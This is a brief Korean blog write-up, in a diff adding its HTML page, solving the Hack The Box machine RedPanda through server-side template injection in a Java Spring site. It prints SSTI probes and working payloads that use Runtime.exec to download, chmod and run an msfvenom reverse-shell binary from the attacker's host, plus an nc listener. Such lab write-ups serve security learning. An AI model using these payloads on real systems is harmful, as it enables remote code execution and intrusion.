@@ -1,0 +1,735 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>[ HTB ] - RedPanda - A1mH1gh</title>
+<meta name="description" content="Java Spring Framework를 사용하는 RedPanda Website에서 사용자 입력값 미검증으로 인해 SSTI가 가능하며, 더나아가 리버스쉘을 통한 RCE까지 가능하다  1. RECONNAISSANCE Gather Victim Network Information nmap -sS -sV 10.10.11.170    Search Open Websites/Domains   1) SSTI DETECTION What is SSTI?    https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection      https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology   { {7*7} } ${7*7} &lt;%= 7*7 %&gt; ${ {7*7} } #{7*7} *{7*7}     *{T(java.lang.System).getenv()}    2) SSTI to RCE  nc -lvnp 443  443번 포트를 열어주고 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f elf &gt; r.elf  리버스쉘 제작한 뒤 mv ./r.elf /var/www/html  임시 웹서버 디렉토리에 저장  *{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;wget 10.10.14.2/r.elf&quot;)}  *{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;chmod 777 ./r.elf&quot;)}  *{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;./r.elf&quot;)}  공격자의 웹서버에서 리버스쉘을 다운받아 실행    flag는 /home/woodenk에 있음  done.">
+
+
+  <meta name="author" content="A1mH1gh">
+  
+  <meta property="article:author" content="A1mH1gh">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="A1mH1gh">
+<meta property="og:title" content="[ HTB ] - RedPanda">
+<meta property="og:url" content="http://localhost:4000/htb_writeup/HTB-RedPanda/">
+
+
+  <meta property="og:description" content="Java Spring Framework를 사용하는 RedPanda Website에서 사용자 입력값 미검증으로 인해 SSTI가 가능하며, 더나아가 리버스쉘을 통한 RCE까지 가능하다  1. RECONNAISSANCE Gather Victim Network Information nmap -sS -sV 10.10.11.170    Search Open Websites/Domains   1) SSTI DETECTION What is SSTI?    https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection      https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology   { {7*7} } ${7*7} &lt;%= 7*7 %&gt; ${ {7*7} } #{7*7} *{7*7}     *{T(java.lang.System).getenv()}    2) SSTI to RCE  nc -lvnp 443  443번 포트를 열어주고 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f elf &gt; r.elf  리버스쉘 제작한 뒤 mv ./r.elf /var/www/html  임시 웹서버 디렉토리에 저장  *{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;wget 10.10.14.2/r.elf&quot;)}  *{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;chmod 777 ./r.elf&quot;)}  *{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;./r.elf&quot;)}  공격자의 웹서버에서 리버스쉘을 다운받아 실행    flag는 /home/woodenk에 있음  done.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-09-21T00:00:00+09:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb_writeup/HTB-RedPanda/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "A1mH1gh",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="A1mH1gh Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          A1mH1gh
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/HTB_Writeup/">HTB Writeup</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/VulnWebs_Writeup/">VulnWebs Writeup</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="http://localhost:4000/">
+        <img src="/assets/img/bow.png" alt="A1mH1gh" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">A1mH1gh</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Pentesting Log</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Republic of Korea</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:A1mH1gh4909@gmail.com" rel="me" class="u-email">
+            <meta itemprop="email" content="A1mH1gh4909@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="[ HTB ] - RedPanda">
+    <meta itemprop="description" content="Java Spring Framework를 사용하는 RedPanda Website에서 사용자 입력값 미검증으로 인해 SSTI가 가능하며, 더나아가 리버스쉘을 통한 RCE까지 가능하다1. RECONNAISSANCEGather Victim Network Informationnmap -sS -sV 10.10.11.170Search Open Websites/Domains1) SSTI DETECTIONWhat is SSTI?  https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology{ {7*7} }${7*7}&lt;%= 7*7 %&gt;${ {7*7} }#{7*7}*{7*7}*{T(java.lang.System).getenv()}2) SSTI to RCEnc -lvnp 443443번 포트를 열어주고msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f elf &gt; r.elf리버스쉘 제작한 뒤mv ./r.elf /var/www/html임시 웹서버 디렉토리에 저장*{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;wget 10.10.14.2/r.elf&quot;)}*{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;chmod 777 ./r.elf&quot;)}*{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;./r.elf&quot;)}공격자의 웹서버에서 리버스쉘을 다운받아 실행flag는 /home/woodenk에 있음done.">
+    <meta itemprop="datePublished" content="2022-09-21T00:00:00+09:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="http://localhost:4000/htb_writeup/HTB-RedPanda/" class="u-url" itemprop="url">[ HTB ] - RedPanda
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#1-reconnaissance">1. RECONNAISSANCE</a><ul><li><a href="#gather-victim-network-information">Gather Victim Network Information</a></li><li><a href="#search-open-websitesdomains">Search Open Websites/Domains</a><ul><li><a href="#1-ssti-detection">1) SSTI DETECTION</a></li><li><a href="#2-ssti-to-rce">2) SSTI to RCE</a></li></ul></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/191496659-556e151d-f70c-4ec2-84c9-b42b6cf5bc9b.png" alt="Untitled" /></p>
+
+<p><strong>Java Spring Framework</strong>를 사용하는 RedPanda Website에서 사용자 입력값 미검증으로 인해 <strong>SSTI</strong>가 가능하며, 더나아가 리버스쉘을 통한 <strong>RCE</strong>까지 가능하다</p>
+
+<h1 id="1-reconnaissance">1. RECONNAISSANCE</h1>
+<h2 id="gather-victim-network-information">Gather Victim Network Information</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sS -sV 10.10.11.170
+</code></pre></div></div>
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/191502117-001734e2-263c-475d-b01e-994daa42ce42.png" alt="image" /></p>
+
+<h2 id="search-open-websitesdomains">Search Open Websites/Domains</h2>
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/191507308-35043a20-a651-40a9-bb94-22bad0a5131a.png" alt="image" /></p>
+
+<h3 id="1-ssti-detection">1) SSTI DETECTION</h3>
+<p>What is SSTI?</p>
+<blockquote>
+  <p>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</p>
+</blockquote>
+
+<blockquote>
+  <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{ {7*7} }
+${7*7}
+&lt;%= 7*7 %&gt;
+${ {7*7} }
+#{7*7}
+*{7*7}
+</code></pre></div></div>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/191520582-9ba1085c-d49b-4af9-b68e-06f923994cc6.png" alt="image" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*{T(java.lang.System).getenv()}
+</code></pre></div></div>
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/191521138-55ea8dab-dd33-45a3-8629-3861ceed31d0.png" alt="image" /></p>
+
+<h3 id="2-ssti-to-rce">2) SSTI to RCE</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 443
+</code></pre></div></div>
+<p>443번 포트를 열어주고</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f elf &gt; r.elf
+</code></pre></div></div>
+<p>리버스쉘 제작한 뒤</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mv ./r.elf /var/www/html
+</code></pre></div></div>
+<p>임시 웹서버 디렉토리에 저장</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.10.14.2/r.elf")}
+
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}
+
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}
+</code></pre></div></div>
+<p>공격자의 웹서버에서 리버스쉘을 다운받아 실행</p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/191523782-a754acb5-0518-4cc4-97f7-e4c9620bee72.png" alt="image" /></p>
+
+<p>flag는 /home/woodenk에 있음</p>
+
+<p>done.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#rce" class="page__taxonomy-item p-category" rel="tag">RCE</a><span class="sep">, </span>
+    
+      <a href="/tags/#ssti" class="page__taxonomy-item p-category" rel="tag">SSTI</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#htb-writeup" class="page__taxonomy-item p-category" rel="tag">HTB_Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2022-09-21T00:00:00+09:00">September 21, 2022</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=%5B+HTB+%5D+-+RedPanda%20http%3A%2F%2Flocalhost%3A4000%2Fhtb_writeup%2FHTB-RedPanda%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhtb_writeup%2FHTB-RedPanda%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fhtb_writeup%2FHTB-RedPanda%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="#" class="pagination--pager disabled">Previous</a>
+    
+    
+      <a href="/htb_writeup/HTB-Fawn/" class="pagination--pager" title="[ HTB ] - Fawn
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-x.x.137.97/" rel="permalink">[ VulnWebs ] - x.x.137.97
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">RECON
+
+OS: CentOS
+WAS: Apache/2.4.6
+Lang: PHP/7.2.34
+
+File Upload
+업로드 페이지가 존재하며
+http://x.x.137.97/upload.php
+
+
+
+확장자 ‘.php’를 가지는 php코드 파일을 업로드 시도
+import reque...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testhtml5.vulnweb.com/" rel="permalink">[ VulnWebs ] - testhtml5.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+
+WAS: Nginx/1.19.0
+
+
+XSS
+
+로그인 페이지에서
+http://testhtml5.vulnweb.com/#/popular
+
+스크립트 구문으로 로그인 하면
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+
+...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testaspnet.vulnweb.com/" rel="permalink">[ VulnWebs ] - testaspnet.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+OS: Windows Server
+WAS: IIS/8.5
+Lang: ASP.NET
+
+
+
+
+Information Leakage
+서버 내 미존재 페이지에 접속할 경우 에러페이지가 반환되며 서버 정보관련 정보를 노출하고 있음
+http://testaspnet.vulnwe...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testasp.vulnweb.com/" rel="permalink">[ VulnWebs ] - testasp.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+
+
+OS: Windows Server
+WAS: Microsoft-IIS/8.5
+Lang: ASP.NET
+
+Information Leakage
+임의값을 전송하여 서버 에러를 유발시켜 서버 정보를 노출시킴
+http://testasp.vulnweb.com/showfor...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 A1mH1gh. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
